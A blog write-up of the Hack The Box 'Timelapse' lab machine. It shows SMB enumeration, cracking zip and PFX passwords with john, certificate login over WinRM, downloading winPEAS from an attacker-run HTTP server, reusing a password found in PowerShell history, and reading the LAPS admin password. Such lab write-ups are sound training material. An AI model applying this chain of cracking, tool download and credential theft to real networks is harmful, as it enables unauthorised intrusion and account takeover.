---
layout: post
title: "HTB: Timelapse"
author: Andrew Cherney
date: 2023-01-26 20:58:03
tags: htb easy-box active-directory smb john windows
icon: "/assets/icons/timelapse.png"
post_description: "The steps to solve this box require knowledge in certificate/key infrastructure, Windows services, command history files, and LAPS permissions. Initial foothold steps utilize password cracking for both a zip and pfx file to yield public and private keys. Then a hard coded password can be found and the local admin password can be read after pivoting to that new account. "
---

<h1>Summary</h1>

The steps to solve this box require knowledge in certificate/key infrastructure, Windows services, command history files, and LAPS permissions. Initial foothold steps utilize password cracking for both a zip and pfx file to yield public and private keys. Then a hard coded password can be found and the local admin password can be read after pivoting to that new account.  

<h1>Enumeration</h1>

<h2>rustscan</h2>

```bash
rustscan 10.10.11.152 | tee results.scan
```

_Editors note: this is an old box writeup and I was using a different version of rustscan which is why the default output is different than other writeups on this blog._

```
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain? 
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-06-10 09:28:00Z)
135/tcp   open  msrpc Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
389/tcp   open  ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 126
5986/tcp  open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf .NET Message Framing
49667/tcp open  msrpc Microsoft Windows RPC
49673/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc Microsoft Windows RPC
49696/tcp open  msrpc Microsoft Windows RPC
55158/tcp open  msrpc Microsoft Windows RPC
```

If we didn't know this was a windows machine already that scan is a shining beacon to indicate so. Now nmap is flagging port 445 as potentially microsoft-ds, but that port is commonly used for file sharing with SMB on Windows. 

<h2>Port 445 - SMB</h2>

I'll list the shares available on the SMB service and go from there. 

```bash
┌─[✗]─[raccoon@garbagebin]─[~/_hacking/Hackthebox/.old/Timelapse]
└──╼ $smbclient -L 10.10.11.152
Enter WORKGROUP\raccoon's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

```bash
┌─[raccoon@garbagebin]─[~/_hacking/Hackthebox/.old/Timelapse]
└──╼ $smbclient --no-pass //10.10.11.152/Shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

		6367231 blocks of size 4096. 1253777 blocks available
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 10:48:42 2021
  ..                                  D        0  Mon Oct 25 10:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 09:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 09:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 09:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 09:57:44 2021

		6367231 blocks of size 4096. 1251743 blocks available
smb: \HelpDesk\> cd ../Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

		6367231 blocks of size 4096. 1251364 blocks available
smb: \Dev\> get winrm_backup.zip 
```

<h1>User as legacyy</h1>

<h2>Zip Cracking</h2>

In the Shares/Dev folder there is a password protected zip. I'll use my best hash cracker john to convert the zip to a hash and then crack the password.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $zip2john winrm_backup.zip > winrm_backup_hash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $john winrm_backup_hash --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2023-02-01 19:56) 16.66g/s 57890Kp/s 57890Kc/s 57890KC/s surfroxy154..supergay01
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx 
```

<h2>PFX Cracking</h2>

That file is a Windows Personal Information Exchange file which contains both a public key and private key. With some digging I found [a script](https://github.com/crackpkcs12/crackpkcs12) to crack the password, but I also found a [PFX to hash](https://github.com/openwall/john/blob/bleeding-jumbo/run/pfx2john.py) python script that I want to use instead. After I crack the password I can use it to extract the private key and the certificate using openssl.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $python3 pfx2john.py legacyy_dev_auth.pfx > pfx_hash
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $john --show pfx_hash 
legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx

1 password hash cracked, 0 left
```

<h2>Cert and Key Extracting</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
Enter Import Password:
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key -nodes
Enter Import Password:
```

<h2>Evil-winrm</h2>

Now before using these to connect I need to clean them up since the top 7 or so lines are metadata. The last piece of this puzzle is evil-winrm, which will let me connect if I use both the public certificate and the private key. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $evil-winrm -S -i 10.10.11.152 -k priv.key -c cert.pem 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

<h1>User as svc_deploy</h1>

<h2>winPEAS</h2>

Easiest option from here is to get winPEAS on the machine and run it. I'll start up a python http server and transfer the executable. 


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
*Evil-WinRM* PS C:\Users\legacyy\Downloads> Invoke-WebRequest http://10.10.14.5:8000/winPEASx64.exe -OutFile winPEASx64.exe
*Evil-WinRM* PS C:\Users\legacyy\Downloads> ./winPEASx64.exe
```

Sifting through the results of winPEAS I come across a powershell command history file. In it is a chain of commands to run the command <code>whoami</code> after authenticating with a hard coded password. These commands are run on localhost as svc_deploy. 

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found History Files
File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> Get-Content ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

<h1>Root</h1>

<h2>LAPS_Readers</h2>

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

In simple enumeration I come across the group membership LAPS_Readers. This is a group that allows the user to read LAPS resources, and effectively read local admin passwords. That password is located under the property **ms-Mcs-AdmPwd** and will display the plaintext credential. 

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter * -Properties ms-mcs-AdmPwd 


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-AdmPwd     : ),T]Y7;31yb20L(;ZASe7/,A
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Timelapse]
└──╼ $evil-winrm -S -i 10.10.11.152 -u Administrator -p '),T]Y7;31yb20L(;ZASe7/,A'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

<h2>Flag</h2>

There is one final step to this box. The root flag is not in the local admin home directory, and is instead inside of the TRX user home directory. I did some post reading after solving the box and it is probably setup like this to allow a random local admin password. 

```powershell
*Evil-WinRM* PS C:\Users\TRX\Desktop> ls


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/2/2023   3:36 AM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX\Desktop> Get-Content root.txt
08a1ef600b3d----------------
```
